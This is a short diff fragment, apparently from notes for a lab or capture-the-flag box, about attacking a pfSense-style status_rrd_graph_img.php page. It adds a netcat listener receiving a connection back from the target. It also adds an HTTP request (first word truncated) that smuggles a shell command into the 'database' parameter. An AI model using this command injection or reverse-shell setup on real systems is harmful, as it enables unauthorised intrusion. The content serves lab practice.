@@ -4,3 +4,16 @@ https://10.129.73.176/status_rrd_graph_img.php?start=1621149559&graph=eight_hour
 
 
 
+hippoeug@kali:~$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.42] from (UNKNOWN) [10.129.73.176] 5374
+/var/db/rrd
+hippoeug@kali:~$ 
+
+
+
+
+
+
+ET /status_rrd_graph_img.php?database=queues;echo+"CMD+INJECT">cmd.txt HTTP/1.1
+
